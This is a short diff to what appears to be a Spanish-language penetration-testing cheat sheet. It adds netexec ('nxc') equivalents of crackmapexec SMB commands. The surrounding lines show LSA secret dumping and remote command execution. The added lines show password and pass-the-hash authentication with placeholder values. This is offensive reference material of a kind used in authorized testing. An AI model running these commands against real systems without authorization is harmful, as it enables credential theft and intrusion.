@@ -153,3 +153,8 @@ crackmapexec smb [IP] -u [USER] -p [PASS] --lsa
 
 # Ejecutar comando
 crackmapexec smb [IP] -u [USER] -p [PASS] -x '[COMANDO]'
+
+# nxc es el alias moderno de netexec (sucesor de crackmapexec)
+# Misma sintaxis: sustituir 'crackmapexec' por 'nxc'
+nxc smb [IP] -u [USER] -p [PASS]
+nxc smb [IP] -u [USER] -H [NT-HASH]
